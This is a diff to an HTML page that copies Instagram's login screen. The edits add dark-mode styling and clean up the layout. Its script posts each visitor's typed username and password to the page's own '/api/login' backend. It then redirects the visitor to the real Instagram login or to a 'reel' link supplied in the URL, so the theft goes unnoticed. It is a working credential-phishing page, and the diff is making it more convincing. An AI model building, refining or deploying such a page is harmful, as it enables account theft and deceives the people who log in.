@@ -5,44 +5,102 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
     <style>
+        /* 1. DEFINE COLOR VARIABLES */
+        :root {
+            --bg-color: #fafafa;
+            --box-bg: #ffffff;
+            --border-color: #dbdbdb;
+            --text-primary: #262626;
+            --text-secondary: #8e8e8e;
+            --link-color: #00376b;
+            --input-bg: #fafafa;
+        }
+
+        /* 2. DARK THEME OVERRIDE */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #000000;
+                --box-bg: #000000;
+                --border-color: #262626;
+                --text-primary: #f5f5f5;
+                --text-secondary: #a8a8a8;
+                --link-color: #e0f1ff;
+                --input-bg: #121212;
+            }
+            /* Invert the logo color for dark mode since it's a black PNG/SVG */
+            .logo { filter: invert(1); }
+        }
+
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
+
+        body { 
+            background-color: var(--bg-color); 
+            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            flex-direction: column; 
+            transition: background 0.3s ease; /* Smooth transition when switching */
+        }
         
         .container { width: 350px; display: flex; flex-direction: column; gap: 10px; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; }
+
+        .box { 
+            background: var(--box-bg); 
+            border: 1px solid var(--border-color); 
+            padding: 10px 40px; 
+            text-align: center; 
+        }
         
-        input { width: 100%; height: 38px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; }
-        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 4px; height: 30px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+        .logo { width: 175px; margin: 36px 0 12px; }
+
+        form { display: flex; flex-direction: column; margin-top: 24px; }
         
-        .logo { width: 175px; margin: 20px 0 30px; }
-        .get-app { text-align: center; margin: 15px 0; font-size: 14px; }
-        .store-imgs img { height: 40px; margin: 0 4px; }
+        input { 
+            width: 100%; height: 38px; 
+            background: var(--input-bg); 
+            border: 1px solid var(--border-color); 
+            color: var(--text-primary);
+            border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; 
+        }
+
+        button { 
+            width: 100%; background: #0095f6; color: white; border: none; 
+            border-radius: 8px; height: 32px; font-weight: 600; cursor: pointer; margin: 8px 0; 
+        }
+        
+        .forgot-link { margin: 12px 0; font-size: 12px; color: var(--link-color); text-decoration: none; display: block; }
+        .signup-text { font-size: 14px; margin: 15px 0; color: var(--text-primary); }
+        .signup-text span { color: #0095f6; font-weight: 600; cursor: pointer; }
+        .get-app { text-align: center; margin-top: 20px; font-size: 14px; color: var(--text-primary); }
+        .store-imgs { display: flex; justify-content: center; gap: 8px; margin-top: 20px; }
+        .store-imgs img { height: 40px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo">
-        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
         <form id="loginForm">
             <input type="text" id="username" placeholder="Phone number, username, or email" required>
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit">Log in</button>
         </form>
-
-        <div style="margin-top: 20px; font-size: 13px; color: #00376b;">Forgot password?</div>
+        <a href="#" class="forgot-link">Forgot password?</a>
     </div>
 
     <div class="box">
-        <p style="font-size: 14px;">Don't have an account? <span style="color: #0095f6; font-weight: 600;">Sign up</span></p>
+        <p class="signup-text">Don't have an account? <span>Sign up</span></p>
     </div>
 
     <div class="get-app">
         <p>Get the app.</p>
         <div class="store-imgs">
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmSByX.png">
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
+            <img src="https://get.microsoft.com/images/en-us%20dark.svg" alt="Get it from Microsoft">
         </div>
     </div>
 </div>
@@ -50,29 +108,20 @@
 <script>
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        
         const user = document.getElementById('username').value;
         const pass = document.getElementById('password').value;
 
-        // 1. Send data to your Vercel Backend
-        await fetch('/api/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user, pass })
-        });
+        try {
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user, pass })
+            });
+        } catch (err) { console.error(err); }
 
-        // 2. REDIRECT LOGIC
-        // Grab the 'reel' parameter from the URL (e.g., ?reel=https://instagram.com/...)
         const params = new URLSearchParams(window.location.search);
         const nextLink = params.get('reel');
-
-        if (nextLink) {
-            // If a link was provided, go there
-            window.location.href = nextLink;
-        } else {
-            // Default fallback
-            window.location.href = "https://www.instagram.com/accounts/login/";
-        }
+        window.location.href = nextLink || "https://www.instagram.com/accounts/login/";
     });
 </script>
 
